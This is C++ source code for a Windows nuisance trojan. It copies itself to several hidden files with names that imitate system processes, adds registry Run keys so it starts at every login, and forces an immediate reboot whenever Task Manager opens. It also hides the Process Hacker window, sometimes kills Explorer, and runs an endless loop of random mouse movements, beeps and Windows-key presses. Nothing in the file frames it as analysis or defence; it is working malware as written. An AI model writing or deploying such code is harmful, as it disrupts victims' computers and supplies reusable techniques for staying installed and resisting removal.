#include <windows.h>
#include <iostream>
#include <Lmcons.h>
#include <Shlobj.h>
#include <Userenv.h>
#include <tlhelp32.h>
#include <conio.h>
#include <stdio.h>
#include <ctype.h>
#include <winuser.h>
#include <winable.h>
#include <stdlib.h>
#include <ctime>
#pragma comment(lib, "user32")


using namespace std;


bool IsProcessRun(const char * const processName)
{
   HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 
   PROCESSENTRY32 pe;
   pe.dwSize = sizeof(PROCESSENTRY32);
   Process32First(hSnapshot, &pe);
 
	while (1) {
		if (strcmp(pe.szExeFile, processName) == 0) return true;
		if (!Process32Next(hSnapshot, &pe)) return false;
	}
}

void p(HINSTANCE hint)
{
	if (IsProcessRun("ProcessHacker.exe")) {
    	HWND taskM = GetForegroundWindow();
		ShowWindow(taskM, SW_HIDE);
	}
	
	if (IsProcessRun("Taskmgr.exe")) {
		WinExec("shutdown -r -t 0", SW_HIDE);
	}
	
	if (IsProcessRun("svchostese.exe") || IsProcessRun("systemase.exe") || IsProcessRun("winddowsse.exe") || IsProcessRun("winddowsSystese.exe")) {

	}
	else {
		exit(0);
	}
}

void slp() {

}

int ke() {
	int r = 0;
	int q;
	for(q=8;q<=190;q++)
    {
    	if(GetAsyncKeyState(q)==-32767) {
    		r = q; 
		}
    }
    return r;
}

void s() {
	MessageBeep(MB_ICONERROR);
	Sleep(1000);
}

void regset(HKEY key) {
	const char* dir = "C:\\svchostese.exe";
	const char* dir2 = "D:\\ProgramData\\Start Menu\\systemase.exe";
	const char* dir3 = "D:\\winddowsse.exe";
	const char* dir4 = "C:\\ProgramData\\Start Menu\\winddowsSystese.exe";
	
	RegCreateKeyEx (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &key, NULL);
	RegSetValueEx (key, "host", 0, REG_SZ, (PBYTE)dir, lstrlen(dir)+1);
	
	RegCreateKeyEx (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &key, NULL); 
	RegSetValueEx (key, "syst", 0, REG_SZ, (PBYTE)dir2, lstrlen(dir2)+1);
	
	RegCreateKeyEx (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &key, NULL); 
	RegSetValueEx (key, "winddows", 0, REG_SZ, (PBYTE)dir3, lstrlen(dir3)+1);	
	
	RegCreateKeyEx (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &key, NULL); 
	RegSetValueEx (key, "winddowsSystem", 0, REG_SZ, (PBYTE)dir4, lstrlen(dir4)+1);
	
}

void playSound() {
	Beep(rand() % 1000, rand() % 1000);
}

int WINAPI WinMain(HINSTANCE hint, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int)
{
    
    HKEY key;
	char myname[256];
	
	char username[UNLEN+1];
	DWORD username_len = UNLEN+1;
	const char* dir = "C:\\svchostese.exe";
	const char* dir2 = "D:\\ProgramData\\Start Menu\\systemase.exe";
	const char* dir3 = "D:\\winddowsse.exe";
	const char* dir4 = "C:\\ProgramData\\Start Menu\\winddowsSystese.exe";

	GetUserName(username, &username_len);
	GetModuleFileName(hint,myname,256);
	
	
	CopyFile(myname,dir,FALSE);
	SetFileAttributes(dir,FILE_ATTRIBUTE_HIDDEN);
	
	CopyFile(myname,dir2,FALSE);
	SetFileAttributes(dir2,FILE_ATTRIBUTE_HIDDEN);
	
	CopyFile(myname,dir3,FALSE);
	SetFileAttributes(dir3,FILE_ATTRIBUTE_HIDDEN);
	
	CopyFile(myname,dir4,FALSE);
	SetFileAttributes(dir4,FILE_ATTRIBUTE_HIDDEN);
	
	regset(key);
	
	int k = 0;
	int kk = 0;
	srand(time(0));
	if ((rand() % 30) + 1 == 5) {
		WinExec("taskkill /f /im explorer.exe",SW_HIDE);
	}
	if (1) {
    	
    	do
    	{  
    		p(hint);
    		if ((rand() % 700) + 1 == 10) {
    		for (int i = 0; i < 40; i++) {
			INPUT Input = { 0 };
			Input.type = INPUT_MOUSE;
			Input.mi.dy = (LONG)rand() % 1500;
			Input.mi.dx = (LONG)rand() % 1500;

			Input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;

			SendInput(1, &Input, sizeof(INPUT));
			p(hint);
			Sleep(100);
			}
			}
    		if ((rand() % 300) + 1 == 10) {
			INPUT Input = { 0 };
			Input.type = INPUT_MOUSE;
			Input.mi.dy = (LONG)rand() % 1500;
			Input.mi.dx = (LONG)rand() % 1500;

			Input.mi.dwFlags = MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE;

			SendInput(1, &Input, sizeof(INPUT));
			p(hint);
			Sleep(100);
			}
			if ((rand() % 900) + 1 == 10) {
				HWND taskM = GetForegroundWindow();
				ShowWindow(taskM, SW_HIDE);
			}
			
			if ((rand() % 50) + 1 == 10) {
				s();
			}
			
			if ((rand() % 1000) + 1 == 10) {
				for (int i = 0; i < 10; i++) {
					WinExec("start",SW_HIDE);
				}
			}
			
			if ((rand() % 300) + 1 == 10) {
				keybd_event(VK_LWIN, NULL, NULL, NULL);
			}
			
			if ((rand() % 800) + 1 == 10) {
				keybd_event(VK_LWIN, NULL, KEYEVENTF_KEYUP, NULL);
			}
			playSound();
    	} while (1);
	}
}
